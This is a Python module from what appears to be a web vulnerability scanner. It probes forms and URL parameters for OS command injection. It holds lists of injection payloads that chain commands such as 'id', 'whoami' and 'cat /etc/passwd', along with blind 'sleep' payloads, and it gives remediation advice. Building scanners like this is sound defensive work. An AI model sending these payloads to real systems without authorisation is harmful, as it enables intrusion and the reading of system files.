from __future__ import annotations
"""
scanner/testers/cmdi.py
-------------------------
OS Command Injection vulnerability tester.

Command injection occurs when user input is passed unsanitized to a shell
command, letting attackers execute arbitrary OS commands and typically
achieve full server compromise.

Detection methods:
  1. Output-based: inject commands like `id` or `whoami` and look for
     OS-specific output (uid=, root:) appearing in the response.
  2. Time-based (blind): inject `sleep 5` and measure wall-clock delay.
     Used when output is not reflected but execution still occurs.

Variants tested:
  - Semicolon separator       ; id
  - Pipe                      | id
  - AND chain                 && id
  - Backtick substitution     `id`
  - Dollar substitution       $(id)
  - Windows equivalents       & dir, & whoami

OWASP ref: A03:2021 Injection, CWE-78
"""

import logging
import re

from scanner.crawler import CrawledForm, CrawledPage
from scanner.reporting.models import Finding, Severity, VulnType
from scanner.testers.base import BaseTester
from scanner.utils import http as http_utils

logger = logging.getLogger(__name__)

_REMEDIATION = (
    "Never pass user input to shell commands. Use parameterized subprocess calls "
    "(list form, not shell=True). If OS execution is necessary, strictly whitelist "
    "allowed characters and commands. Apply least-privilege to the application user. "
    "Ref: OWASP OS Command Injection Defense Cheat Sheet."
)

_SLEEP_SECONDS  = 5
_SLEEP_THRESHOLD = 4.0

# (payload, expected_string_in_response)
_OUTPUT_PAYLOADS: list[tuple[str, str]] = [
    # Unix — id command
    ("; id",             "uid="),
    ("| id",             "uid="),
    ("&& id",            "uid="),
    ("`id`",             "uid="),
    ("$(id)",            "uid="),
    # Unix — whoami
    ("; whoami",         "root"),
    ("| whoami",         "root"),
    # Unix — /etc/passwd read
    ("; cat /etc/passwd",    "root:"),
    ("| cat /etc/passwd",    "root:"),
    ("$(cat /etc/passwd)",   "root:"),
    # Windows — dir command
    ("& dir",            "volume in drive"),
    ("| dir",            "volume in drive"),
    # Windows — whoami (output is DOMAIN\user)
    ("& whoami",         "\\"),
    # Windows — type win.ini
    ("& type C:\\windows\\win.ini", "[extensions]"),
]

_TIME_PAYLOADS: list[str] = [
    f"; sleep {_SLEEP_SECONDS}",
    f"| sleep {_SLEEP_SECONDS}",
    f"&& sleep {_SLEEP_SECONDS}",
    f"`sleep {_SLEEP_SECONDS}`",
    f"$(sleep {_SLEEP_SECONDS})",
    f"& ping -n {_SLEEP_SECONDS + 1} 127.0.0.1",   # Windows equivalent
    f"; sleep {_SLEEP_SECONDS} #",                  # comment-terminated
]


# Regex patterns for stronger confirmation of command output (reduces FPs)
_CONFIRM_REGEX: dict[str, re.Pattern] = {
    "uid=":          re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),
    "root":          re.compile(r"^(root|www-data|nobody|daemon|apache|nginx)\s*$", re.MULTILINE),
    "root:":         re.compile(r"root:x?:0:0:"),
    "[extensions]":  re.compile(r"\[extensions\]"),
    "[fonts]":       re.compile(r"\[fonts\]"),
    "[boot loader]": re.compile(r"\[boot loader\]"),
    "volume in drive": re.compile(r"Volume in drive [A-Z]", re.IGNORECASE),
    "\\":            re.compile(r"^[A-Za-z0-9_-]+\\[A-Za-z0-9_.$-]+$", re.MULTILINE),
    "localhost":     re.compile(r"^\s*127\.0\.0\.1\s+localhost", re.MULTILINE),
    "HTTP_":         re.compile(r"HTTP_[A-Z_]+="),
}


class CmdInjectionTester(BaseTester):
    """Tests for OS command injection via output-based and time-based (blind) methods."""

    def __init__(self) -> None:
        super().__init__(name="Command Injection Tester")

    def run(self, pages: list[CrawledPage]) -> list[Finding]:
        self.findings.clear()
        self._params_tested = 0

        for page in pages:
            for form in page.forms:
                for field in form.testable_fields:
                    if not self._output_form(form, field.name):
                        self._time_form(form, field.name)
            for param in page.get_params:
                if not self._output_get(page.url, param):
                    self._time_get(page.url, param)

        return self.findings

    # ------------------------------------------------------------------
    # Output-based
    # ------------------------------------------------------------------

    def _output_form(self, form: CrawledForm, field_name: str) -> bool:
        self._count_test()

        # Fetch baseline to avoid flagging markers already present in normal responses
        try:
            baseline_data = self._inject_form(form, field_name, "baseline_cmdi_test")
            if form.method == "POST":
                baseline_resp = http_utils.post(form.action_url, data=baseline_data)
            else:
                baseline_resp = http_utils.get(form.action_url, params=baseline_data)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_text = ""

        for payload, confirm in _OUTPUT_PAYLOADS:
            data = self._inject_form(form, field_name, payload)
            try:
                if form.method == "POST":
                    resp = http_utils.post(form.action_url, data=data)
                else:
                    resp = http_utils.get(form.action_url, params=data)
            except Exception:
                continue

            if confirm.lower() in resp.text.lower():
                # Skip if the same marker already appears in the baseline
                if baseline_text and confirm.lower() in baseline_text.lower():
                    continue
                # Apply regex confirmation if available
                regex = _CONFIRM_REGEX.get(confirm)
                if regex and not regex.search(resp.text):
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.CMD_INJECTION,
                    severity=Severity.CRITICAL,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload,
                    evidence=f"Command output marker '{confirm}' found in response",
                    remediation=_REMEDIATION,
                ))
                return True
        return False

    def _output_get(self, url: str, param_name: str) -> bool:
        self._count_test()

        # Fetch baseline to avoid flagging markers already present in normal responses
        try:
            baseline_url = self._inject_get_param(url, param_name, "baseline_cmdi_test")
            baseline_resp = http_utils.get(baseline_url)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_text = ""

        for payload, confirm in _OUTPUT_PAYLOADS:
            injected = self._inject_get_param(url, param_name, payload)
            try:
                resp = http_utils.get(injected)
            except Exception:
                continue

            if confirm.lower() in resp.text.lower():
                # Skip if the same marker already appears in the baseline
                if baseline_text and confirm.lower() in baseline_text.lower():
                    continue
                # Apply regex confirmation if available
                regex = _CONFIRM_REGEX.get(confirm)
                if regex and not regex.search(resp.text):
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.CMD_INJECTION,
                    severity=Severity.CRITICAL,
                    url=injected,
                    parameter=param_name,
                    method="GET",
                    payload=payload,
                    evidence=f"Command output marker '{confirm}' found in response",
                    remediation=_REMEDIATION,
                ))
                return True
        return False

    # ------------------------------------------------------------------
    # Time-based (blind)
    # ------------------------------------------------------------------

    def _time_form(self, form: CrawledForm, field_name: str) -> bool:
        try:
            base = self._inject_form(form, field_name, "test")
            if form.method == "POST":
                _, baseline = http_utils.timed_post(form.action_url, data=base)
            else:
                _, baseline = http_utils.timed_get(form.action_url, params=base)
        except Exception:
            return False

        for payload in _TIME_PAYLOADS:
            data = self._inject_form(form, field_name, payload)
            try:
                if form.method == "POST":
                    _, elapsed = http_utils.timed_post(form.action_url, data=data)
                else:
                    _, elapsed = http_utils.timed_get(form.action_url, params=data)
            except Exception:
                continue

            delta = elapsed - baseline
            if delta >= _SLEEP_THRESHOLD:
                # Confirmation pass — require the delay to reproduce.
                try:
                    if form.method == "POST":
                        _, elapsed2 = http_utils.timed_post(form.action_url, data=data)
                    else:
                        _, elapsed2 = http_utils.timed_get(form.action_url, params=data)
                except Exception:
                    continue
                if (elapsed2 - baseline) < _SLEEP_THRESHOLD:
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.CMD_INJECTION,
                    severity=Severity.CRITICAL,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload,
                    evidence=(
                        f"Blind cmdi: response delayed {delta:.2f}s, reproduced at "
                        f"{elapsed2 - baseline:.2f}s (baseline={baseline:.2f}s, "
                        f"threshold={_SLEEP_THRESHOLD}s)"
                    ),
                    remediation=_REMEDIATION,
                ))
                return True
        return False

    def _time_get(self, url: str, param_name: str) -> bool:
        try:
            base_url = self._inject_get_param(url, param_name, "test")
            _, baseline = http_utils.timed_get(base_url)
        except Exception:
            return False

        for payload in _TIME_PAYLOADS:
            injected = self._inject_get_param(url, param_name, payload)
            try:
                _, elapsed = http_utils.timed_get(injected)
            except Exception:
                continue

            delta = elapsed - baseline
            if delta >= _SLEEP_THRESHOLD:
                # Confirmation pass — require the delay to reproduce.
                try:
                    _, elapsed2 = http_utils.timed_get(injected)
                except Exception:
                    continue
                if (elapsed2 - baseline) < _SLEEP_THRESHOLD:
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.CMD_INJECTION,
                    severity=Severity.CRITICAL,
                    url=injected,
                    parameter=param_name,
                    method="GET",
                    payload=payload,
                    evidence=(
                        f"Blind cmdi: response delayed {delta:.2f}s, reproduced at "
                        f"{elapsed2 - baseline:.2f}s (baseline={baseline:.2f}s, "
                        f"threshold={_SLEEP_THRESHOLD}s)"
                    ),
                    remediation=_REMEDIATION,
                ))
                return True
        return False
